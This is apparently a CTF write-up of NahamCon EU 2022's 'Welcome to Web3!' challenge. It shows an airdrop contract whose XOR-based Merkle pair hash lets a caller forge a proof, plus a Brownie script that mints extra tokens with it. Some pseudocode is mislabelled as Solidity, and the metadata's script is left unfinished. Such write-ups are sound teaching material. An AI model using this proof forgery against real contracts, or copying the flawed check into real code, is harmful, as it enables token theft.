---
title: NahamCon EU CTF 2022 – Welcome to Web3! (Airdrop.sol Merkle proof)
contest: NahamCon EU
year: 2022
difficulty: hard
vuln_type: web_unknown
tags: [Web3, Airdrop.sol, Merkle proof, 4 元素 proof, Brownie 部署, ERC20 mint]
attack_chain: |
  1. 题目: NahamCon EU CTF 2022 Welcome to Web3! — Airdrop 合约 mint 挑战
  2. 合约:
     - SimpleToken(ERC20) + Airdrop(Airdrop)
     - Airdrop.mintToken(merkleProof): 验证 msg.sender == merkleProof[0], proof 长度 4, proofHash == merkleRoot
     - 攻击: 调用 mintToken 让 totalSupply 从 100000 涨到 200000
  3. mint 函数:
     - require(msg.sender == airdropAddress)
     - _mint(addr, amount) 增加 totalSupply
  4. 解决: 给定 _merkleRoot 和 4 元素 proof + msg.sender → 改 proof[0] = account.address → 改 proof[1] 让 pairHash 还原
     - pairHash(a, b) = keccak256(abi.encode(a ^ b)) (XOR pair)
     - proofHash: pairHash(pairHash(pairHash(a, b), c), d) == merkleRoot
  5. 解题: 计算新 pair = pairHash(prev) ⊕ target_root 凑成 proof[1]
key_payload: |
  # Merkle proof 验证:
  function proofHash(bytes32[] memory nodes) internal pure returns (bytes32 result) {
      result = pairHash(nodes[0], nodes[1]);
      for (uint256 i = 2; i < nodes.length; i++) {
          result = pairHash(result, nodes[i]);
      }
  }
  function pairHash(bytes32 a, bytes32 b) internal pure returns (bytes32) {
      return keccak256(abi.encode(a ^ b));
  }
  
  # mint:
  function mint(address addr, uint256 amount) external {
      require(msg.sender == airdropAddress, "You can't call this");
      _mint(addr, amount);
  }
  
  function mintToken(bytes32[] memory merkleProof) external {
      require(!dropped[msg.sender], "Already dropped");
      require(merkleProof.length == proofLength, "Tree length mismatch");
      require(address(uint160(uint256(merkleProof[0]))) == msg.sender, "First Merkle leaf should be the msg.sender's address");
      require(proofHash(merkleProof) == merkleRoot, "Merkle proof failed");
      dropped[msg.sender] = true;
      token.mint(msg.sender, dropPerAddress);
      _latestAcceptedProof = merkleProof;
  }
  
  # 解决 (Brownie):
  from brownie import Airdrop, accounts, convert
  contract = Airdrop.at("0xA15BB66138824a1c7167f5E85b957d04Dd34E468")
  account = accounts[0]
  merkleProof = [
      convert.to_bytes(account.address).hex(),  # 0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266
      # 计算 proof[1] 让 pairHash 凑到 merkleRoot
  ]
  contract.mintToken(merkleProof, {'from': account})
one_liner: NahamCon EU CTF 2022 Welcome to Web3!: Airdrop.sol 4 元素 Merkle proof 验证, 改 proof[0]=account.address, 凑 proof[1] 让 pairHash 等于 merkleRoot。
lesson: |
  - Merkle proof 验证: pairHash(a, b) = keccak256(abi.encode(a ^ b))
  - 攻击: proof[0] = msg.sender (可改), 改 proof[1] 让最终 hash 等于 merkleRoot
  - simpleToken 总供应量 100000 + airdrop 100000 = 200000 → solved()
  - Brownie 部署 + 调用 mintToken
  - Web3 CTF 入门题型: Merkle tree 验证 + ERC20 mint
quality: high
---

# NahamCon EU CTF 2022 – Welcome to Web3!

> 来源: ctfiot.com 85511

## 合约

```solidity
function solved() {
    token = SimpleToken[-1];
    if (token.totalSupply() == 200000) {
        return True, "Solved!";
    } else {
        return False, "Not solved, you need to mint enough to solve.";
    }
}

function deploy() {
    ADMIN = accounts[9];
    token = SimpleToken.deploy('Simple Token', 'STK', {'from': ADMIN});
    _merkleRoot = 0x654ef3fa251b95a8730ce8e43f44d6a32c8f045371ce6a18792ca64f1e148f8c;
    airdrop = Airdrop.deploy(token, 1e5, _merkleRoot, 4, {'from': ADMIN});
    token.setAirdropAddress(airdrop, {'from': ADMIN});

    merkleProof = [
        int(convert.to_bytes(ADMIN.address).hex(), 16),
        0x000000000000000000000000feb7377168914e8771f320d573a94f80ef953782,
        0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6,
        0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563
    ];
    airdrop.mintToken(merkleProof);
}
```

## Merkle 验证

```solidity
function proofHash(bytes32[] memory nodes) internal pure returns (bytes32 result) {
    result = pairHash(nodes[0], nodes[1]);
    for (uint256 i = 2; i < nodes.length; i++) {
        result = pairHash(result, nodes[i]);
    }
}

function pairHash(bytes32 a, bytes32 b) internal pure returns (bytes32) {
    return keccak256(abi.encode(a ^ b));
}

function mintToken(bytes32[] memory merkleProof) external {
    require(!dropped[msg.sender], "Already dropped");
    require(merkleProof.length == proofLength, "Tree length mismatch");
    require(address(uint160(uint256(merkleProof[0]))) == msg.sender, "First Merkle leaf should be the msg.sender's address");
    require(proofHash(merkleProof) == merkleRoot, "Merkle proof failed");
    dropped[msg.sender] = true;
    token.mint(msg.sender, dropPerAddress);
    _latestAcceptedProof = merkleProof;
}
```

## 攻击

```python
from brownie import Airdrop, accounts, convert

contract = Airdrop.at("0xA15BB66138824a1c7167f5E85b957d04Dd34E468")
account = accounts[0]

# 改 proof[0] = account.address, 算 proof[1] 让 pairHash 凑到 merkleRoot
merkleProof = [
    0x000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266,  # account
    0x000000000000000000000000adc69b805f1aba6eb34c04277eae5760308b82c4,  # 新计算
    0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6,
    0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563
]
contract.mintToken(merkleProof, {'from': account})
```

## 评价

NahamCon EU CTF 2022 Web3 入门题：
- **Airdrop.sol** Merkle proof 验证
- **pairHash XOR** 巧用：改 proof[0] 后可以反推 proof[1] 让最终 hash 等于 merkleRoot
- **ERC20 mint** 触发 totalSupply 100000 → 200000
- **Brownie** 部署 + 调用

适用读者：Web3 入门 / Solidity 合约安全 / Merkle tree
